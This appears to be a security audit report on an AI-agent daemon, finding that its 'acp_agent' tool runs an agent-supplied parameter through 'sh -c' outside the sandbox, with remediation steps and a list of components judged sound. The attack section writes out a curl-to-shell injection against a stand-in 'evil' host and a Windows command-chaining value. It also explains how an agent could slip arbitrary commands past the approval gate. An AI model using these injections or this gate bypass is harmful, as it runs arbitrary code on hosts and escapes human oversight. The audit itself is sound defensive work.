# Security Hunt — Code Execution & Sandbox

Scope: command construction from untrusted input, sandbox/containment escapes,
MCP stdio arg construction, insecure deserialization, shell quote-mangling,
template injection. Posture exclusions honored (default-allow, net-on sandbox,
max-capability code_exec, ProfileNone-on-Windows are intentional and NOT flagged).

---

## Finding 1 — `acp_agent` tool runs agent-supplied string through `sh -c` / `cmd /C` (catalog-slug parameter silently accepts an arbitrary shell command)

- Severity: HIGH (MEDIUM when the daemon runs in Ask/HITL mode; HIGH under the owner's documented default-allow posture)
- CWE: CWE-78 (OS Command Injection) / CWE-441 (Confused Deputy) / CWE-1389 (Incorrect behavior vs. advertised contract)
- Confidence: HIGH that the code path exists and executes; MEDIUM that it is exploitable in a default deployment (depends on the operator's Edict trust level for `acp_agent`).

Files / lines:
- `kernel/acpcatalog/acpcatalog.go:256-270` — `ResolveCommand(ref, fallback)`. When `ref` (the agent-supplied `agent` field) does NOT match a catalog slug, it is returned VERBATIM as the launch command: `// Not a known slug — treat as a raw command (advanced/custom use). return ref, true`.
- `plugins/tools/acpagent/acpagent.go:131` — `cmd, ok := acpcatalog.ResolveCommand(in.Agent, t.Cmd)` where `in.Agent` comes straight from the tool's JSON input (`acpagent.go:118-121`).
- `plugins/tools/acpagent/acpagent.go:231-233` — `spawnAgent` runs the resolved string through the platform shell: `shell, arg := platformShell(); c := exec.Command(shell, arg, cmdStr)` i.e. `sh -c <cmdStr>` (POSIX) or `cmd /C <cmdStr>` (Windows). `platformShell()` is at `acpagent.go:220-225`.
- Capability mapping: `kernel/edict/toolmap.go:147-148` maps the whole `acp_agent` tool to `CapACPAgent` REGARDLESS of the `agent` parameter value. So a benign "delegate to gemini" call and a "run my shell payload" call exercise the identical gate.

Attack:
1. The model/agent calls the `acp_agent` tool with `{"task":"...","agent":"; curl http://evil/x.sh | sh ; echo "}` (POSIX) or `agent: "x & calc.exe"` (Windows). `ResolveCommand` finds no catalog slug match → returns the string verbatim → `spawnAgent` executes `sh -c "; curl http://evil/x.sh | sh ; echo "`.
2. Under the owner's documented default-allow posture (`cmd/agezt/main.go:390-395` sets every capability to `LevelAllow` with `UnknownAllow=true`), `CapACPAgent` is allowed with NO human approval — agent-controlled input reaches `sh -c` directly. This is arbitrary host command execution outside the warden sandbox (acpagent does not route through warden — it spawns directly with `os.Stderr` and inherited cwd).
3. Even in Ask/HITL mode the issue is a confused-deputy: the tool schema (`acpagent.go:97-100`) and description advertise `agent` as "which installed ACP agent to delegate to (catalog slug, e.g. gemini, claude-code, codex)". An operator approving an `acp_agent` call reasonably believes they are approving delegation to a vetted local agent, not an arbitrary shell command. The raw-passthrough is undocumented at the approval surface.

Impact: Arbitrary OS command execution on the host, NOT inside the warden isolation profile (unlike the `shell`/`code_exec` tools which run through `warden.Run`). Compare with the sibling `coding` tool, which deliberately avoids this by passing the task via the `AGEZT_CODING_TASK` env var so "no shell-quoting of model output is needed" (`plugins/tools/coding/coding.go:13-14, 140-143`) — and whose command is operator-configured, never agent-supplied. `acp_agent` is the inconsistent one: its command string is partly agent-supplied.

Why this is a REAL bug and not the intentional posture: the intentional posture is "the agent may run commands through the gated `shell`/`code_exec` tools (warden-isolated) and through operator-configured external-agent commands." Here the COMMAND ITSELF is taken from a tool parameter that is documented as a constrained enum (slug) but is in fact a free-form `sh -c` string, and it bypasses warden. That is an unexpected sink, not a declared capability.

Remediation (any one closes it; do 1+2):
1. In `ResolveCommand`, drop the verbatim-passthrough branch: if `ref` is non-empty and not a known catalog slug, return `("", false)` (reject) instead of treating it as a raw command. Raw custom commands already have a legitimate, operator-only channel: `AGEZT_ACP_AGENT_CMD` (the `fallback`/`t.Cmd`), which is operator-configured, not agent-controlled.
2. If a raw-command escape hatch must remain, gate it behind a SEPARATE, non-default-allow capability (e.g. `acp_agent.raw`) so an operator's blanket `acp_agent` grant does not implicitly grant arbitrary shell, and surface the resolved command string in the approval prompt.
3. Stop using the shell entirely: split the resolved command with a safe tokenizer and `exec.Command(argv[0], argv[1:]...)` (catalog `Command` values are simple space-separated argv like `"gemini --experimental-acp"`), matching the no-shell discipline used by warden, mcp.Dial, toolbox, tunnel, and update.

---

## Areas reviewed and found SOUND (no issue)

- `kernel/mcp/client.go` `Dial` — spawns MCP servers with `exec.Command(command, args...)` (argv, no shell); scrubbed env strips AGEZT_*/secret-shaped vars (`scrubbedEnv`/`isSecretName`, lines 320-356). Operator per-server env opt-in is intentional. Clean.
- `plugins/tools/mcptool/tool.go` — agent self-install of MCP servers (`op=add`/`attach`) with arbitrary command/args is BY DESIGN, gated by `CapMCPInstall` (Ask by default), and dialed via argv (no shell). `toolmap.go:92-105` defaults any unrecognized `op` to the GATED `CapMCPInstall`, so op-spoofing cannot downgrade to a lower gate. Sound.
- `kernel/toolbox/toolbox.go` — installer runs argv slices from a fixed in-code `Catalog`; the install `name` is validated via `byName` against the catalog before any exec, so an attacker-supplied name cannot inject. `Detect`/`Outdated` are read-only argv probes. Clean.
- `kernel/acpcatalog/acpcatalog.go` `Detect`/`probeVersion` — read-only argv `--version` probes on fixed catalog binaries. Clean (the issue is only `ResolveCommand`, Finding 1).
- `kernel/update/update.go` — argv-free (HTTP fetch + atomic rename), TLS enforced on every redirect hop (`requireHTTPS` + `CheckRedirect`), SHA256 + optional Ed25519 signature verification, manifest JSON decoded into a fixed struct. `SpawnRestart` re-execs own binary with a fixed `["daemon"]` argv. Sound.
- `kernel/tunnel/tunnel.go` — command is operator config (provider preset or `AGEZT_TUNNEL_CMD`), run as argv via `exec.CommandContext` (no shell). Clean.
- `plugins/tools/coding/coding.go` — command operator-configured; task passed via `AGEZT_CODING_TASK` env (no model output in the command line); git operations use fixed argv. Sound design (and the model for fixing Finding 1).
- `cmd/agt/listen.go` — `AGEZT_VOICE_RECORD_CMD` is operator env config, tokenized to argv with `{seconds}`/`{out}` substituted per-token (no shell). Operator-controlled. Clean.
- `cmd/agezt/watchdog.go` — re-execs the same binary (self) with a fixed argv; no untrusted input. Clean.
- `plugins/channels/wecom/wecom.go` — `xml.Unmarshal`/`json.Unmarshal` decode webhook bodies into fixed typed structs. Go's `encoding/xml` does not expand external entities (no XXE); AES/base64 use operator-configured keys. No deserialization-to-code path. Clean.
- `kernel/edict/toolmap.go` — capability mapping consistently defaults garbled/unrecognized ops to the MORE-restrictive (gated) capability across `mcp`, `tool_forge`, `workflow`, `config`, `artifacts`, `homeassistant`, `http`. No order-dependent or op-spoofable downgrade found.
- `text/template` / `html/template` — no usages in the Go tree (grep returned none); no server-side template-injection-to-exec surface.
- `gob` decoding — no `gob.Decode`/`gob.NewDecoder` in non-test code.
